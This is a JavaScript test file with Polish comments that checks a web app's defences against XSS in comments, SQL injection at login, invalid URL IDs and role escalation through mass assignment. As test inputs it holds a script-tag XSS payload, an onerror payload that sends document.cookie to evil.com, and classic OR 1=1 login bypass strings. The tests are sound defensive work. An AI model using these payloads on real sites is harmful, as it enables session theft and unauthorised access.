'use strict';
/**
 * TJ-04 — Testy sanityzacji wejść i ochrony przed wstrzyknięciami
 * Pokrycie: XSS w komentarzach, SQL injection w logowaniu, walidacja ID
 */
const request = require('supertest');
const app     = require('../server');

// Wyciąga cookie "token=" z tablicy Set-Cookie
function findTokenCookie(setCookieHeader) {
  if (!setCookieHeader) return null;
  const arr = Array.isArray(setCookieHeader) ? setCookieHeader : [setCookieHeader];
  const entry = arr.find(c => c.startsWith('token='));
  return entry ? entry.split(';')[0] : null;
}

// Rejestracja i logowanie jako ANALITYK — potrzebne do POST /api/comments
let analitykCookie = null;
beforeAll(async () => {
  const id = `XSS-${Date.now()}`;
  await request(app).post('/api/register')
    .send({ agent_id: id, password: 'TestPass99!', role: 'ANALITYK' });
  const res = await request(app).post('/api/login')
    .send({ username: id, password: 'TestPass99!' });
  analitykCookie = findTokenCookie(res.headers['set-cookie']);
});

// ── Testy sanityzacji ────────────────────────────────────────────────────────
describe('Sanityzacja wejść i ochrona przed wstrzyknięciami', () => {

  // XSS — komentarze (wymagają roli ANALITYK)
  it('TJ-04a: payload XSS w treści komentarza jest sanityzowany przez sanitize-html', async () => {
    if (!analitykCookie) return;
    // Payload z prefiksem tekstowym — sanitize-html usuwa <script>, ale "Meldunek: " zostaje,
    // dzięki czemu content nie jest pusty i nie narusza CHECK constraint bazy.
    const xssPayload = 'Meldunek: <script>alert(document.cookie)</script>';
    const res = await request(app)
      .post('/api/comments')
      .set('Cookie', analitykCookie)
      .send({ author: 'TEST-XSS', content: xssPayload });
    expect(res.status).toBe(200);
    // Pobierz komentarze i sprawdź brak tagu <script>
    const listRes = await request(app).get('/api/comments');
    const last = listRes.body[0];
    expect(last.content).not.toMatch(/<script>/i);
  });

  it('TJ-04b: payload onerror XSS jest usuwany', async () => {
    if (!analitykCookie) return;
    const payload = '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">';
    await request(app)
      .post('/api/comments')
      .set('Cookie', analitykCookie)
      .send({ author: 'TEST-XSS2', content: payload });
    const listRes = await request(app).get('/api/comments');
    const last = listRes.body[0];
    expect(last.content).not.toMatch(/onerror/i);
  });

  // SQL Injection — logowanie
  it('TJ-04c: klasyczny payload SQLi w username nie omija logowania', async () => {
    const res = await request(app)
      .post('/api/login')
      .send({ username: "' OR '1'='1", password: "' OR '1'='1" });
    expect(res.status).toBe(401);
  });

  it('TJ-04d: payload SQLi z komentarzem nie omija logowania', async () => {
    const res = await request(app)
      .post('/api/login')
      .send({ username: 'admin--', password: "anything' OR 1=1--" });
    expect(res.status).toBe(401);
  });

  // Walidacja parametrów URL
  it('TJ-04e: ujemne ID w URL zwraca 400', async () => {
    const res = await request(app).delete('/api/comments/-1');
    expect([400, 401, 403]).toContain(res.status);
    if (res.status === 400) {
      expect(res.body.error).toMatch(/ID/i);
    }
  });

  it('TJ-04f: tekstowe ID w URL zwraca 400 lub 403 (nie 500)', async () => {
    const res = await request(app).delete('/api/comments/abc');
    expect(res.status).not.toBe(500);
    expect([400, 401, 403]).toContain(res.status);
  });

  // Mass assignment
  it('TJ-04g: pole "role" w PUT /api/profile jest ignorowane przez serwer', async () => {
    const id = `MASS-${Date.now()}`;
    await request(app).post('/api/register')
      .send({ agent_id: id, password: 'TestPass99!', role: 'ANALITYK' });
    const loginRes = await request(app).post('/api/login')
      .send({ username: id, password: 'TestPass99!' });
    const cookieStr = findTokenCookie(loginRes.headers['set-cookie']);
    if (!cookieStr) return;

    // Próba eskalacji uprawnień przez mass assignment
    await request(app)
      .put('/api/profile')
      .set('Cookie', cookieStr)
      .send({ bio: 'test', role: 'OPERACYJNY' });

    // Sprawdź że rola się nie zmieniła
    const meRes = await request(app)
      .get('/api/me')
      .set('Cookie', cookieStr);
    expect(meRes.body.role).not.toBe('OPERACYJNY');
  });
});
